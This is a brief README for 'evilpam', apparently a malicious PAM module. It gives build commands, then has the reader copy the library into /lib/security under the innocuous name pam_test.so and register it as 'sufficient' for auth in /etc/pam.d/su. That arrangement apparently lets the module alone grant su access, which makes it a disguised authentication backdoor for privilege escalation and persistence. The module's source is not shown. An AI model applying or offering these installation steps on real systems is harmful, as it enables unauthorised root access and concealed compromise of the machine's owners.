# evilpam

```
mkdir -p build && cd build
cmake ..
make
```

```
mv evilpam.so /lib/security/pam_test.so
```

add in `/etc/pam.d/su`

```
auth            sufficient      pam_test.so
```